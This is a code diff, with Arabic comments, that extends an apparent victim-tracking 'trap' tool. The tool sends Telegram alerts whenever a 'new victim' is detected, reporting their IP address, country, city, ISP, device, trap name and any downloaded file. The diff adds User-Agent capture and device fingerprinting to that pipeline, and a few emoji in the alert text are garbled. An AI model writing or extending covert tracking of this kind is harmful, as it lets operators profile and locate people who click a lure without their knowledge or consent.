@@ -16,8 +16,8 @@ logger = logging.getLogger(__name__)
 
 # ============= دوال Telegram الموحدة =============
 
-def send_telegram_alert(ip, trap_name, device="Unknown"):
-    """إرسال تنبيه إلى Telegram عند اكتشاف ضحية"""
+def send_telegram_alert(ip, trap_name, device="Unknown", file_name=""):
+    """إرسال تنبيه إلى Telegram عند اكتشاف ضحية أو تحميل ملف"""
     token = config.get_key("TELEGRAM_BOT_TOKEN")
     chat_id = config.get_key("TELEGRAM_CHAT_ID")
     
@@ -37,15 +37,17 @@ def send_telegram_alert(ip, trap_name, device="Unknown"):
     except Exception as e:
         logger.error(f"Error fetching geo data: {e}")
 
+    file_info = f"\ud83d\udcc4 الملف: {file_name}" if file_name else ""
     message = f"""
 🎯 تنبيه: تم اكتشاف ضحية جديدة!
 
-📍 عنوان IP: {ip}
-🌍 الدولة: {geo_data['country']}
+📄 عنوان IP: {ip}
+🌐 الدولة: {geo_data['country']}
 🏙️ المدينة: {geo_data['city']}
-🏢 مزود الخدمة: {geo_data['isp']}
+🏒 مزود الخدمة: {geo_data['isp']}
 📱 الجهاز: {device}
 🎯 المصيدة: {trap_name}
+{file_info}
 ⏰ الوقت: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
     """
     
@@ -110,6 +112,39 @@ def clear_victims_log():
     except Exception as e:
         logger.error(f"Error clearing victims log: {e}")
         return False
+
+# ============= دوال الحصول على معلومات العميل =============
+
+def get_user_agent():
+    """الحصول على User-Agent من رؤوس الطلب"""
+    try:
+        if hasattr(st, 'context') and hasattr(st.context, 'headers'):
+            headers = st.context.headers
+            if 'User-Agent' in headers:
+                return headers['User-Agent']
+    except:
+        pass
+    return 'Unknown'
+
+def detect_device_from_user_agent(user_agent):
+    """تحديث نوع الجهاز من User-Agent"""
+    if not user_agent:
+        return 'Unknown'
+    
+    user_agent_lower = user_agent.lower()
+    
+    if 'android' in user_agent_lower:
+        return 'Android'
+    elif 'iphone' in user_agent_lower or 'ipad' in user_agent_lower or 'ipod' in user_agent_lower:
+        return 'iOS'
+    elif 'windows' in user_agent_lower:
+        return 'Windows'
+    elif 'macintosh' in user_agent_lower or 'mac os' in user_agent_lower:
+        return 'MacOS'
+    elif 'linux' in user_agent_lower:
+        return 'Linux'
+    else:
+        return 'Unknown'
 
 # ============= دوال الحصول على IP =============
 
